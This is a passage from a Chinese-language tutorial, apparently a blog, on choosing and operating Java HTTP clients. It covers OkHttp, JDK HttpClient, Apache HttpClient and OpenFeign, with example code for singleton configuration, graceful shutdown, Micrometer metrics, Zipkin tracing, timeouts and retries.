<li><strong>实践</strong>: 结合服务发现（如Nacos）和Spring Cloud LoadBalancer，OpenFeign能够自动实现客户端负载均衡和高可用，这是微服务架构的刚需。<strong>务必记得</strong>通过引入<code>feign-okhttp</code>或<code>feign-httpclient</code>依赖并开启配置，为其配置一个带连接池的底层客户端，以保证生产环境的性能。</li>
</ul>
<hr>
<h3 id="2-3-非Spring项目或工具库：OkHttp-是通用优选"><a href="#2-3-非Spring项目或工具库：OkHttp-是通用优选" class="headerlink" title="2.3. 非Spring项目或工具库：OkHttp 是通用优选"></a>2.3. 非Spring项目或工具库：<code>OkHttp</code> 是通用优选</h3><ul>
<li><strong>理由</strong>: 当你脱离了Spring的“温室”，或者在开发一个需要被广泛使用的独立工具库时，OkHttp是事实上的最佳选择。它轻量、高效、API极其友好，且拥有强大的拦截器机制。其“开箱即用”的高性能（自动连接池和HTTP&#x2F;2）使得开发者无需过多配置就能获得优秀表现。</li>
<li><strong>实践</strong>: 在任何需要一个可靠、现代且易于使用的第三方HTTP客户端的Java项目中，OkHttp都应该被列为首选。其广泛的社区支持和在Android上的统治地位也证明了其稳定性和成熟度。</li>
</ul>
<hr>
<h3 id="2-4-无第三方依赖要求：JDK-11-HttpClient"><a href="#2-4-无第三方依赖要求：JDK-11-HttpClient" class="headerlink" title="2.4. 无第三方依赖要求：JDK 11+ HttpClient"></a>2.4. 无第三方依赖要求：<code>JDK 11+ HttpClient</code></h3><ul>
<li><strong>理由</strong>: 这是JDK HttpClient最核心的价值主张。在某些场景下，避免引入第三方依赖是首要目标，例如：开发一个需要保持“纯净”的公共库、编写一个简单的命令行工具、或在有严格第三方依赖审计策略的企业环境中工作。</li>
<li><strong>实践</strong>: 如果你的项目环境确定为Java 11+，并且HTTP调用需求相对标准（不需要复杂的认证或连接池调优），那么使用JDK HttpClient是最直接、最简洁的方案。它的<code>CompletableFuture</code>-based异步API也是一大亮点，非常适合现代并发编程。</li>
</ul>
<hr>
<h3 id="2-5-维护遗留系统或需要特殊企业功能：Apache-HttpClient"><a href="#2-5-维护遗留系统或需要特殊企业功能：Apache-HttpClient" class="headerlink" title="2.5. 维护遗留系统或需要特殊企业功能：Apache HttpClient"></a>2.5. 维护遗留系统或需要特殊企业功能：<code>Apache HttpClient</code></h3><ul>
<li><strong>理由</strong>: Apache HttpClient是久经考验的“老兵”，它的最大优势在于其无与伦比的功能覆盖面和可配置性。特别是在处理一些棘手的企业级场景时，它的优势无人能及。</li>
<li><strong>实践</strong>:<ul>
<li><strong>维护遗留项目</strong>: 如果你正在维护一个大量使用<code>RestTemplate</code>（底层为Apache HttpClient）或直接使用Apache HttpClient的旧项目，保持技术栈的一致性通常比引入新客户端更稳妥。</li>
<li><strong>复杂认证</strong>: 如果你需要与要求<strong>NTLM</strong>或**Kerberos (SPNEGO)**认证的Windows企业服务（如SharePoint）集成，Apache HttpClient提供了最成熟、最简单的解决方案。</li>
<li><strong>极限调优</strong>: 如果你需要对HTTP连接的每一个细节（如SSL握手、代理链、连接验证策略等）进行“像素级”的控制，Apache HttpClient提供了最多的底层“旋钮”供你调节。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="七、高级主题与最佳实践"><a href="#七、高级主题与最佳实践" class="headerlink" title="七、高级主题与最佳实践"></a>七、高级主题与最佳实践</h1><h2 id="1-HttpClient实例管理"><a href="#1-HttpClient实例管理" class="headerlink" title="1. HttpClient实例管理"></a>1. HttpClient实例管理</h2><p>无论是<code>Apache HttpClient</code>、<code>OkHttpClient</code>、<code>JDK 11+ HttpClient</code>，还是通过Builder构建的<code>WebClient</code>，它们的客户端实例（<code>CloseableHttpClient</code>, <code>OkHttpClient</code>, <code>HttpClient</code>, <code>WebClient</code>）在设计上都是<strong>线程安全</strong>的，并且被设计为<strong>可复用</strong>的重量级对象。</p>
<p>因此，在整个应用程序的生命周期中，<strong>必须将这些客户端实例作为单例来管理和使用</strong>。</p>
<p><strong>原因剖析：</strong></p>
<ol>
<li><strong>资源管理的核心——连接池（Connection Pool）</strong>:<ul>
<li>HTTP客户端性能优化的基石在于<strong>连接复用</strong>。客户端实例内部持有并管理着一个连接池。这个连接池维护了到不同目标主机的TCP连接（对于HTTPS，还包括TLS会话）。</li>
<li><strong>如果为每个请求都创建一个新的客户端实例</strong>，就意味着为每个请求都创建了一个新的、独立的连接池。请求结束后，这个连接池连同它里面的连接（通常只有一个）就被丢弃了。</li>
<li><strong>后果</strong>: 每次请求都需要经历昂贵的TCP三次握手和TLS握手过程，这会极大地增加请求延迟、消耗客户端和服务器的CPU资源，并可能在短时间内耗尽客户端的可用端口（导致<code>TIME_WAIT</code>状态泛滥）。这完全违背了使用高级HTTP客户端的初衷。</li>
<li><strong>正确做法</strong>: 共享一个单例的客户端实例，让所有并发的请求都从同一个连接池中获取和复用连接。</li>
</ul>
</li>
<li><strong>昂贵的初始化成本</strong>:<ul>
<li>创建一个客户端实例不仅仅是<code>new</code>一个对象那么简单。它涉及到一系列的初始化工作，包括：<ul>
<li>创建和配置连接池。</li>
<li>初始化SSL上下文（<code>SSLContext</code>），这可能涉及读取信任库（TrustStore）和密钥库（KeyStore）。</li>
<li>创建和配置用于异步操作的线程池（例如OkHttp的<code>Dispatcher</code>）。</li>
<li>加载各种配置和策略（如重试、代理、认证等）。</li>
</ul>
</li>
<li>频繁地创建和销毁这些重量级对象会给垃圾回收（GC）带来不必要的压力，影响应用的整体性能。</li>
</ul>
</li>
</ol>
<p><strong>最佳实践：</strong></p>
<ul>
<li><p><strong>在Spring应用中</strong>: 将<code>CloseableHttpClient</code>, <code>OkHttpClient</code>或<code>WebClient</code>声明为一个<strong>Spring Bean</strong>，并确保其作用域是<strong>单例（Singleton）</strong>（这是Spring的默认作用域）。然后在需要使用的地方通过<code>@Autowired</code>依赖注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpClientConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OkHttpClient <span class="title function_">okHttpClient</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在这里进行一次性的、全面的配置</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">                .connectTimeout(<span class="number">10</span>, TimeUnit.SECONDS)</span><br><span class="line">                .readTimeout(<span class="number">30</span>, TimeUnit.SECONDS)</span><br><span class="line">                <span class="comment">// ... 其他配置</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebClient <span class="title function_">webClient</span><span class="params">(OkHttpClient okHttpClient)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> WebClient.builder()</span><br><span class="line">                .clientConnector(<span class="keyword">new</span> <span class="title class_">OkHttp3ClientHttpConnector</span>(okHttpClient))</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在非Spring应用中</strong>: 使用<strong>静态单例模式</strong>（例如，通过静态内部类或枚举）来创建和持有一个全局唯一的客户端实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">HttpClientProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">OkHttpClient</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder().build();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">HttpClientProvider</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> OkHttpClient <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-优雅停机"><a href="#2-优雅停机" class="headerlink" title="2. 优雅停机"></a>2. 优雅停机</h2><p>当应用程序需要关闭时（例如，收到<code>SIGTERM</code>信号或在容器环境中被调度停止），我们需要确保HTTP客户端所占用的资源被正确释放，这就是**优雅停机（Graceful Shutdown）**的一部分。</p>
<ul>
<li><strong>释放网络连接</strong>: 如果不关闭连接池，那些活跃的或空闲的连接可能不会被立即关闭，它们会继续占用操作系统的文件句柄和端口资源，直到TCP超时。在快速重启或频繁部署的场景下，这可能导致资源泄漏。</li>
<li><strong>完成正在进行的任务</strong>: 优雅停机机制通常会等待正在进行的请求在一定时间内完成，而不是粗暴地中断它们，这有助于保证数据的一致性。</li>
</ul>
<p><strong>各客户端的实现方式：</strong></p>
<ul>
<li><p><strong>Apache <code>CloseableHttpClient</code></strong>:</p>
<ul>
<li><code>CloseableHttpClient</code>实现了<code>java.io.Closeable</code>接口。在应用关闭的钩子（Shutdown Hook）中调用其<code>.close()</code>方法即可。这个方法会关闭连接池，并中断所有正在进行的请求。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Spring中，如果Bean的destroyMethod被正确配置（默认是&quot;close&quot;或&quot;shutdown&quot;）</span></span><br><span class="line"><span class="comment">// Spring容器关闭时会自动调用</span></span><br><span class="line"><span class="meta">@Bean(destroyMethod = &quot;close&quot;)</span></span><br><span class="line"><span class="keyword">public</span> CloseableHttpClient <span class="title function_">httpClient</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpClients.createDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>OkHttp <code>OkHttpClient</code></strong>:</p>
<ul>
<li>OkHttp的资源由<code>ConnectionPool</code>和<code>Dispatcher</code>管理。</li>
<li><strong>关闭连接池</strong>: <code>client.connectionPool().evictAll()</code>会关闭并移除池中所有的空闲连接。</li>
<li><strong>关闭线程池</strong>: <code>client.dispatcher().executorService().shutdown()</code>会平滑地关闭用于异步请求的线程池，它会等待已提交的任务完成，但不再接受新任务。</li>
<li><strong>实践</strong>: 通常将这两个操作组合在应用的关闭钩子中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> ...;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在应用的Shutdown Hook中执行</span></span><br><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Shutting down OkHttpClient...&quot;</span>);</span><br><span class="line">    client.dispatcher().executorService().shutdown();</span><br><span class="line">    client.connectionPool().evictAll();</span><br><span class="line">    System.out.println(<span class="string">&quot;OkHttpClient shut down.&quot;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JDK 11+ <code>HttpClient</code></strong>:</p>
<ul>
<li>JDK HttpClient的连接和线程由其内部管理。官方文档并没有提供一个显式的<code>close()</code>方法来关闭整个客户端。</li>
<li>其设计哲学是让JVM在退出时自动清理这些守护线程（Daemon Thread）和资源。对于大多数应用来说，这已经足够。如果需要更精细的控制，可以为客户端提供一个自定义的<code>Executor</code>，然后在应用关闭时手动关闭这个<code>Executor</code>。</li>
</ul>
</li>
<li><p><strong>Spring <code>WebClient</code></strong>:</p>
<ul>
<li><code>WebClient</code>的生命周期由其底层的<code>ClientHttpConnector</code>决定。如果它使用了配置为Bean的<code>OkHttpClient</code>或<code>CloseableHttpClient</code>，那么只需管理好这些底层Bean的生命周期，Spring会自动处理它们的销毁。</li>
</ul>
</li>
</ul>
<p><strong>在Spring Boot中，优雅停机是默认配置的</strong>。当你在<code>application.yml</code>中启用<code>server.shutdown: graceful</code>时，Spring Boot会在关闭时留出一段时间来完成正在处理的Web请求。对于HTTP客户端，只要它们的Bean正确配置了<code>destroyMethod</code>，Spring容器在关闭时就会负责调用它们，从而实现资源的优雅释放。</p>
<hr>
<h2 id="3-监控与可观测性"><a href="#3-监控与可观测性" class="headerlink" title="3. 监控与可观测性"></a>3. 监控与可观测性</h2><p>在微服务架构中，一次用户请求可能会触发一连串的内部HTTP调用。当出现性能问题或错误时，如果无法追踪和度量这些内部调用，排查问题将如同大海捞针。可观测性的三大支柱——<strong>指标（Metrics）</strong>、<strong>追踪（Tracing）日志（Logging）</strong>——对于HTTP客户端的监控至关重要。</p>
<h4 id="3-1-指标监控（Metrics）"><a href="#3-1-指标监控（Metrics）" class="headerlink" title="3.1 指标监控（Metrics）"></a>3.1 指标监控（Metrics）</h4><p><strong>为什么重要？</strong></p>
<p>连接池是HTTP客户端的性能核心，同时也是最容易出现瓶颈的地方。如果连接池耗尽，所有需要发起HTTP请求的业务线程都会被阻塞，导致应用响应缓慢甚至完全卡死。通过监控连接池的各项指标，我们可以：</p>
<ul>
<li><strong>预警问题</strong>: 在连接池达到极限前发现趋势并发出警报。</li>
<li><strong>性能调优</strong>: 根据实际负载数据，合理调整连接池的配置参数（如最大连接数、单路由最大连接数）。</li>
<li><strong>容量规划</strong>: 了解系统在高峰期对外部服务的调用压力。</li>
</ul>
<p><strong>监控什么？</strong></p>
<p>对于连接池，我们最关心以下指标：</p>
<ul>
<li><strong>Active Connections</strong> (活跃连接数): 正在执行请求的连接数量。</li>
<li><strong>Idle Connections</strong> (空闲连接数): 已建立但当前未被使用的连接数量。</li>
<li><strong>Pending Connections</strong> (等待连接数): 因连接池已满，正在等待获取连接的请求数量。<strong>这是最关键的告警指标</strong>，一个持续不为零的<code>pending</code>值表明连接池已成为瓶颈。</li>
<li><strong>Max Connections</strong> (最大连接数): 连接池配置的最大容量。</li>
</ul>
<p><strong>如何实现 (使用Micrometer和Spring Boot Actuator)</strong></p>
<p><a target="_blank" rel="noopener" href="https://micrometer.io/">Micrometer</a>是现代Java应用中事实上的指标门面（Facade），类似于SLF4J在日志领域的地位。Spring Boot Actuator深度集成了Micrometer，可以<strong>自动</strong>为多种HTTP客户端的连接池暴露指标。</p>
<p><strong>步骤:</strong></p>
<ol>
<li><p><strong>引入依赖</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot Actuator for monitoring endpoints --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Micrometer registry for your monitoring system, e.g., Prometheus --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-registry-prometheus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>正确配置HTTP客户端Bean</strong>:<br>只要你将<code>RestTemplate</code>或<code>WebClient</code>配置为Spring Bean，并为其正确配置了底层的<code>OkHttpClient</code>或<code>Apache HttpClient</code>（同样是Bean），Spring Boot的自动配置机制就会生效。</p>
</li>
<li><p><strong>开启配置</strong>: 在<code>application.yml</code>中，确保相关配置开启。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="comment"># 暴露prometheus端点，供Prometheus服务抓取</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">prometheus,</span> <span class="string">health</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">    <span class="comment"># 开启对HTTP客户端请求的计时统计</span></span><br><span class="line">    <span class="attr">enable:</span></span><br><span class="line">      <span class="attr">http.client.requests:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 确保针对具体实现的binder是开启的（通常是自动的）</span></span><br><span class="line">    <span class="attr">binders:</span></span><br><span class="line">      <span class="attr">httpcomponents.enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">okhttp3.enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看指标</strong>:<br>启动应用后，访问<code>/actuator/prometheus</code>端点，你就能看到类似以下的指标（以Apache HttpClient为例）：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># HELP http_client_connections_active The number of active connections</span><br><span class="line"># TYPE http_client_connections_active gauge</span><br><span class="line">http_client_connections_active&#123;clientName=&quot;your.host.com&quot;, name=&quot;default&quot;,...&#125; 2.0</span><br><span class="line"></span><br><span class="line"># HELP http_client_connections_idle The number of idle connections</span><br><span class="line"># TYPE http_client_connections_idle gauge</span><br><span class="line">http_client_connections_idle&#123;clientName=&quot;your.host.com&quot;, name=&quot;default&quot;,...&#125; 8.0</span><br><span class="line"></span><br><span class="line"># HELP http_client_connections_pending The number of pending connections</span><br><span class="line"># TYPE http_client_connections_pending gauge</span><br><span class="line">http_client_connections_pending&#123;clientName=&quot;your.host.com&quot;, name=&quot;default&quot;,...&#125; 0.0</span><br><span class="line"></span><br><span class="line"># HELP http_client_connections_max The maximum number of connections</span><br><span class="line"># TYPE http_client_connections_max gauge</span><br><span class="line">http_client_connections_max&#123;clientName=&quot;your.host.com&quot;, name=&quot;default&quot;,...&#125; 50.0</span><br></pre></td></tr></table></figure>

<p>将这些指标接入Prometheus + Grafana，就可以轻松创建出连接池监控大盘和告警规则。</p>
</li>
</ol>
<hr>
<h4 id="3-2-分布式追踪（Tracing）"><a href="#3-2-分布式追踪（Tracing）" class="headerlink" title="3.2 分布式追踪（Tracing）"></a>3.2 分布式追踪（Tracing）</h4><p><strong>为什么重要？</strong></p>
<p>在一个复杂的微服务调用链（例如 <code>A -&gt; B -&gt; C</code>）中，如果调用C的服务出现缓慢，最终用户会感知到服务A的API响应缓慢。分布式追踪技术能够将这整条调用链路串联起来，可视化地展示每个环节的耗时，从而快速定位性能瓶ň颈。</p>
<p><strong>核心概念:</strong></p>
<ul>
<li><strong>Trace</strong>: 一次完整的、跨越多个服务的请求链路，由一个唯一的<code>Trace ID</code>标识。</li>
<li><strong>Span</strong>: 链路中的一个基本工作单元，例如一次HTTP调用、一次DB查询。它有自己的<code>Span ID</code>和父Span的ID（<code>Parent ID</code>）。</li>
<li><strong>Trace Context</strong>: <code>Trace ID</code>和<code>Span ID</code>等上下文信息，<strong>必须在服务间的调用中进行传递</strong>，通常是通过HTTP Header。</li>
</ul>
<p><strong>如何实现 (使用Micrometer Tracing，前身为Spring Cloud Sleuth)</strong></p>
<p>在Spring Boot 3.x中，分布式追踪功能被整合进了Micrometer。其核心思想是<strong>自动化的上下文传播</strong>。</p>
<p><strong>步骤:</strong></p>
<ol>
<li><p><strong>引入依赖</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Micrometer Tracing核心 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing-bridge-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> <span class="comment">&lt;!-- Brave是Zipkin推荐的Tracer实现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 将追踪数据上报给Zipkin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.zipkin.reporter2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zipkin-reporter-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>配置上报地址</strong>: 在<code>application.yml</code>中配置Zipkin或SkyWalking（以Zipkin为例）的地址。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">tracing:</span></span><br><span class="line">    <span class="comment"># 采样率，1.0表示追踪所有请求，生产环境可适当调低</span></span><br><span class="line">    <span class="attr">sampling:</span></span><br><span class="line">      <span class="attr">probability:</span> <span class="number">1.0</span></span><br><span class="line">  <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">tracing:</span></span><br><span class="line">      <span class="comment"># Zipkin服务器的地址</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">&quot;http://localhost:9411/api/v2/spans&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>魔法发生的地方</strong>:</p>
<ul>
<li>当一个请求进入你的Spring Boot应用时，Micrometer Tracing会自动为其生成一个Trace Context（如果请求头里没有的话）。</li>
<li>当你使用Spring管理的HTTP客户端（<code>RestTemplate</code>, <code>WebClient</code>, <code>OpenFeign</code>）发起出站请求时，<strong>框架会自动将当前的Trace Context注入到HTTP请求头中</strong>（例如，W3C标准的<code>traceparent</code>头）。</li>
<li>当被调用的服务（同样集成了追踪框架）收到这个请求时，它会解析请求头，提取出Trace Context，并创建一个子Span，从而将调用链关联起来。</li>
<li>所有这些操作对开发者都是<strong>完全透明</strong>的，你不需要编写任何传递Header的代码。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="4-健壮性设计"><a href="#4-健壮性设计" class="headerlink" title="4. 健壮性设计"></a>4. 健壮性设计</h2><p>健壮性设计的目标是确保当外部服务出现延迟、错误或完全不可用时，我们的应用依然能够保持稳定，不会被拖垮，并且能为用户提供一个可接受的（哪怕是降级的）体验。</p>
<h3 id="4-1-超时策略"><a href="#4-1-超时策略" class="headerlink" title="4.1 超时策略"></a>4.1 超时策略</h3><p>超时是防止资源（主要是线程）被无限期阻塞的最基本、最重要的防御手段。不设置超时的HTTP调用在生产环境中是极度危险的。</p>
<p><strong>为何要多层次？</strong><br>单一的超时设置往往不够灵活。现代HTTP客户端通常提供多个维度的超时配置，我们需要理解并合理设置它们：</p>
<ol>
<li><strong>连接超时 (Connect Timeout)</strong>:<ul>
<li><strong>含义</strong>: 客户端与目标服务器建立TCP连接的最大等待时间。</li>
<li><strong>作用</strong>: 防止因目标主机宕机、网络不通或防火墙问题导致线程长时间卡在连接阶段。</li>
<li><strong>建议值</strong>: 通常可以设置得较短，例如<strong>1-5秒</strong>。如果在这个时间内无法建立连接，大概率是网络或服务本身存在严重问题，无需再等。</li>
</ul>
</li>
<li><strong>读取超时 &#x2F; Socket超时 (Read Timeout &#x2F; Socket Timeout)</strong>:<ul>
<li><strong>含义</strong>: 连接建立后，等待从服务器接收数据的最大时间间隔（即两次数据包之间的最大间隔）。</li>
<li><strong>作用</strong>: 防止因服务器处理缓慢、逻辑卡死或网络传输中断导致线程在读取响应时被无限期阻塞。</li>
<li><strong>建议值</strong>: 这是最需要根据**下游服务的SLA（服务等级协议）*<em>来设置的值。你应该了解被调用API的P95或P99响应时间，并在此基础上设置一个合理的余量。例如，如果一个API的P99响应时间是2秒，可以设置读取超时为*<em>3-5秒</em></em>。</li>
</ul>
</li>
<li><strong>连接获取超时 (Connection Request Timeout)</strong>:<ul>
<li><strong>含义</strong>: 从连接池获取一个可用连接的最大等待时间。</li>
<li><strong>作用</strong>: 防止当连接池耗尽时，业务线程被无限期阻塞在等待连接的环节。</li>
<li><strong>建议值</strong>: 通常可以设置得非常短，例如<strong>几百毫秒到1秒</strong>。如果连从连接池获取连接都需要很长时间，说明连接池已经成为瓶颈，此时应该快速失败，而不是让更多线程堆积等待。</li>
</ul>
</li>
<li><strong>完整调用超时 (Call Timeout - OkHttp特有)</strong>:<ul>
<li><strong>含义</strong>: 一个HTTP调用的完整生命周期（从开始到接收完响应）的总时长上限。</li>
<li><strong>作用</strong>: 这是一个“兜底”的全局超时，可以防止因多次重定向或复杂的请求&#x2F;响应处理导致的总时间过长。</li>
<li><strong>建议值</strong>: 应大于连接超时和读取超时的总和，并留有余地。例如，<code>callTimeout &gt; connectTimeout + readTimeout</code>。</li>
</ul>
</li>
</ol>
<p><strong>最佳实践</strong>:</p>
<ul>
<li><strong>永远不要使用无限超时</strong>（0或负值）。</li>
<li><strong>为不同下游服务配置不同超时</strong>: 不是所有API的响应时间都一样。通过<code>RequestConfig</code>（Apache HttpClient）或为不同<code>WebClient</code>实例配置不同超时，实现精细化管理。</li>
<li><strong>超时时间应小于上游服务的超时时间</strong>: 例如，如果你的API网关超时是10秒，那么你调用的下游服务的超时总和应显著小于10秒，为网络传输和其他开销留出时间。</li>
</ul>
<hr>
<h3 id="4-2-重试机制"><a href="#4-2-重试机制" class="headerlink" title="4.2 重试机制"></a>4.2 重试机制</h3><p>网络是瞬息万变的，偶尔的抖动或下游服务的临时过载可能导致请求失败（例如，网络I&#x2F;O异常或返回503 Service Unavailable）。对于这类瞬时故障，通过自动重试可以极大地提高系统的可用性和成功率。</p>
<p><strong>核心原则：只重试幂等的请求</strong></p>
<ul>
<li><strong>幂等性 (Idempotence)</strong>: 一个操作执行一次和执行多次产生的最终效果是相同的。<ul>
<li><strong>HTTP方法</strong>: <code>GET</code>, <code>HEAD</code>, <code>PUT</code>, <code>DELETE</code>通常被认为是幂等的。</li>
<li><strong>非幂等</strong>: <code>POST</code>和<code>PATCH</code>通常是非幂等的（例如，<code>POST /orders</code>会创建多个订单）。</li>
</ul>
</li>
<li><strong>风险</strong>: 对非幂等请求进行重试可能导致数据重复或不一致的严重后果。</li>
<li><strong>客户端支持</strong>: Apache HttpClient和OkHttp的内置重试机制默认都遵循此原则，不会重试<code>POST</code>请求。</li>
</ul>
<p><strong>如何实现：</strong></p>
<ul>
<li><strong>Apache HttpClient</strong>: 使用<code>HttpRequestRetryHandler</code>，可以自定义重试次数和重试条件。</li>
<li><strong>OkHttp</strong>: 默认开启了对幂等请求的重试。可以通过<code>.retryOnConnectionFailure(boolean)</code>控制，或通过自定义拦截器实现更复杂的重试逻辑。</li>
